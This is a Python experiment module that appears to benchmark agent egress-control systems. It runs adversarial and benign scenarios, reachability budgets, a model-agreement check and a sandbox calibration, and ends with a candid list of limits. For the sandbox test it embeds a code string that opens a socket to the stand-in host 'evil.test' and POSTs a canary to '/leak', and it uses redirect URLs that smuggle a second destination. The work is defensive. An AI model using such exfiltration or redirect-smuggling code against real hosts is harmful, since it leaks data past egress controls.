"""P44 experiment: paired adversarial/benign scenarios x systems x repetitions, budgeted-reachability study, Emergence integration check, sandbox-bypass calibration. All security outcomes come from the sink process journal."""
from __future__ import annotations
import random, statistics, time
from collections import Counter, defaultdict
from ..emergence.experiment import wilson
from ..emergence import model as EM
from . import scenarios as SC, search as SR
from .scenarios import SYSTEMS


def rate(k, n): return {"k": k, "n": n, "rate": round(k / n, 4) if n else None, "ci": wilson(k, n) if n else None}


def summarize(rows):
    out = {}
    for sysn in SYSTEMS:
        R = [r for r in rows if r["system"] == sysn]; A = [r for r in R if r["kind"] == "attack"]; B = [r for r in R if r["kind"] == "benign"]
        pv = [r for r in A if r["violated"]]; first_use = [r for r in A if r["id"] == "A03"]
        out[sysn] = {"attack_runs": len(A), "attacks_with_forbidden_effect": rate(len(pv), len(A)), "attacks_prevented": rate(len(A) - len(pv), len(A)), "unknown_blocked_attacks": sum(1 for r in A if r["verdict"] == "UNKNOWN" and r["action"] == "BLOCK"),
                     "benign_runs": len(B), "benign_completed": rate(sum(1 for r in B if r["completed"]), len(B)), "benign_blocked": sum(1 for r in B if r["action"] == "BLOCK"),
                     "false_positives_on_approved_redirects_and_variants": rate(sum(1 for r in B if r["id"] in ("B02", "B06a", "B06b", "B06c", "B08") and not r["completed"]), sum(1 for r in B if r["id"] in ("B02", "B06a", "B06b", "B06c", "B08"))),
                     "redirect_and_rebind_race_catches": rate(sum(1 for r in A if r["id"] in ("A04", "A05") and not r["violated"]), sum(1 for r in A if r["id"] in ("A04", "A05"))),
                     "unresolved_destinations": sum(1 for r in R if r["verdict"] == "UNKNOWN" and r["id"] in ("O02", "A06d")),
                     "ms_p50": round(statistics.median(r["ms"] for r in R), 2), "ms_p95": round(sorted(r["ms"] for r in R)[int(0.95 * (len(R) - 1))], 2)}
    return out


def per_scenario(rows):
    t = defaultdict(lambda: defaultdict(list))
    for r in rows: t[r["id"]][r["system"]].append(r)
    meta = {s["id"]: s for s in SC.scenarios()}; out = {}
    for sid, d in t.items():
        out[sid] = {"kind": meta[sid]["kind"], "note": meta[sid]["note"], "systems": {}}
        for sysn, rs in d.items():
            out[sid]["systems"][sysn] = "".join(sorted({("V" if r["violated"] else "-" if r["violated"] is False else "?") + ("C" if r["completed"] else "x") + r["verdict"][0] for r in rs}))
    return out


def reach_study(seed=44):
    rng = random.Random(seed); rows = []
    def chain(n, trust="attested"):
        g = SR.Graph()
        for i in range(n): g.add(i, i + 1, "forward", trust)
        g.modeled.add(n); return g
    def dag(n, fan):
        g = SR.Graph()
        for i in range(n):
            for _ in range(fan): g.add(i, rng.randrange(i + 1, n + 1) if i < n else i, "forward", "attested")
        g.modeled.add(n); return g
    def cyc(n):
        g = SR.Graph()
        for i in range(n): g.add(i, (i + 1) % n, "forward", "attested")
        return g
    for kind, mk in (("chain", chain), ("dag-fan3", lambda n: dag(n, 3)), ("cycle", cyc)):
        for n in (10, 100, 1000, 5000):
            g = mk(n)
            for b in ({"max_nodes": 10_000, "max_depth": 6000}, {"max_nodes": 200, "max_depth": 6000}, {"max_nodes": 10_000, "max_depth": 8}):
                t = SR.reachable(g, 0, **b); rows.append({"graph": kind, "n": n, "edges": sum(len(v) for v in g.edges.values()), "budget": b, "expanded": t.expanded, "reached": len(t.reached), "ms": t.ms, "unknown": t.unknown, "exhausted": t.exhausted, "reasons": t.reasons[:2], "verdict_if_n_forbidden": SR.verdict(t, {n})})
    g = chain(50, "declared"); t = SR.reachable(g, 0); rows.append({"graph": "chain-declared-edges", "n": 50, "edges": 50, "budget": {}, "expanded": t.expanded, "reached": len(t.reached), "ms": t.ms, "unknown": t.unknown, "exhausted": t.exhausted, "reasons": t.reasons[:2], "verdict_if_n_forbidden": SR.verdict(t, {50})})
    return rows


def emergence_agreement():
    out = []
    for known_c in (False, True):
        for a_known in (True, False):
            eps = EM.Endpoints(1001, 1002, 1003, known_c=known_c, a_redirect_known=a_known); g = SR.from_emergence(eps); res = SR.reachable(g, "A")
            for tname, url in {"A/ingest": "http://127.0.0.1:1001/ingest?d=x", "A/redir->B": "http://127.0.0.1:1001/redir?to=http://127.0.0.1:1002/c?d=x", "C/redir->B": "http://127.0.0.1:1003/redir?to=http://127.0.0.1:1002/c?d=x"}.items():
                hops, unknown = EM.chain_of(url, eps); hit_b = any(h[0] == 1002 for h in hops)
                start = "A" if tname.startswith("A") else "C"; r = SR.reachable(g, start); v = SR.verdict(r, {"B"})
                emergence = "DENY" if hit_b else ("UNKNOWN" if unknown else "ALLOW")
                out.append({"known_c": known_c, "a_redirect_known": a_known, "url": tname, "emergence": emergence, "reach": v, "agree": emergence == v, "sound": not (emergence in ("DENY", "UNKNOWN") and v == "ALLOW")})
    return out


def sandbox_bypass():
    from ..coverage import harness as H
    ok, why = H.sandbox_available()
    if not ok: return {"available": False, "why": why}
    from ..runtime import sandbox as SB
    from . import network as N
    with N.Mock(None) as m:
        code = "import socket\ntry:\n s=socket.create_connection(('%s',%d),timeout=1); s.sendall(b'POST /leak HTTP/1.0\\r\\nContent-Length: 22\\r\\n\\r\\nTEST_CANARY_NOT_SECRET'); s.recv(100); print('EFFECT')\nexcept OSError as x: print('ERR',x.errno)" % (N.HOSTS["evil.test"], m.port)
        res = {}
        for name, pol in (("enforcing", SB.Policy()), ("open", SB.Policy.open())):
            n0 = len(m.sink_rows()); r = SB.launch(code, run_id="p44-" + name, policy=pol, timeout_s=15); rows = m.sink_rows()[n0:]; res[name] = {"seen_by_sink": any(x["has_canary"] and x["addr"] == N.HOSTS["evil.test"] for x in rows), "refused": getattr(r, "refused", None)}
    return {"available": True, "why": why, **res}


def run(reps=SC.REPS):
    t0 = time.time(); rows = SC.run_all(SYSTEMS, reps)
    res = {"reps": reps, "systems": list(SYSTEMS), "runs": len(rows), "summary": summarize(rows), "per_scenario": per_scenario(rows), "reach_budget_study": reach_study(), "emergence_agreement": emergence_agreement(), "sandbox_bypass": sandbox_bypass(),
           "scenarios": [{"id": s["id"], "kind": s["kind"], "note": s["note"]} for s in SC.scenarios()]}
    obs = [r for r in rows if r["kind"] == "observability" and r["system"] == "reach"]; res["observability"] = {r["id"] + "#%d" % r["rep"]: {"verdict": r["verdict"], "post_verdict": r["post_verdict"], "receipt": r["receipt"], "oracle": r.get("oracle")} for r in obs}
    a3 = [r for r in rows if r["id"] == "A03"]; res["a03_followup"] = {sysn: {"first_call_violated": sum(1 for r in a3 if r["system"] == sysn and r["violated"]), "audit_detected": sum(1 for r in a3 if r["system"] == sysn and r.get("audit_detected")), "second_call_violated": sum(1 for r in a3 if r["system"] == sysn and r.get("second_call_violated")), "runs": sum(1 for r in a3 if r["system"] == sysn)} for sysn in SYSTEMS}
    res["unsupported_success_claims_O01"] = {sysn: sum(1 for r in rows if r["id"] == "O01" and r["system"] == sysn and r["post_verdict"] == "ALLOW") for sysn in SYSTEMS}
    res["wall_s"] = round(time.time() - t0, 1)
    res["limits"] = ["services, policy, scenarios and oracle clearance table are all written by the same author on one machine; loopback aliases stand in for real hosts and DNS is a mock resolver",
                     "the first use of an ATTESTED external service that lies (A03) is NOT prevented: attestation and signed receipts are claims about the service, and receipts omitted the hidden request; only an independent observer detects it, after the fact, by time window and marker content",
                     "controlled services are confined only because their outbound requests go through the fabric; a service that opens its own sockets must be confined by the P42 sandbox (calibration included when available), which this module does not replace",
                     "the sink oracle journals HTTP requests only; raw TCP bytes that never form a request would not be recorded (unobserved, not 'safe')",
                     "marker detection covers the canary and the known single-step derived forms only; a service that re-encodes the marker twice would not be seen by the oracle (UNKNOWN effect, not 'safe')",
                     "the strict allowlist baseline also checks every URL argument and resolves the name; it is a fair, not a weak, baseline, and it still cannot see a hidden secondary request",
                     "the 'tool-description' baseline trusts a self-declared forward list; no language model reads descriptions here",
                     "budgeted-reach timings are single-process Python microbenchmarks on synthetic graphs",
                     "no third-party host was contacted; remote effect descriptions from real services were not available to test"]
    return res
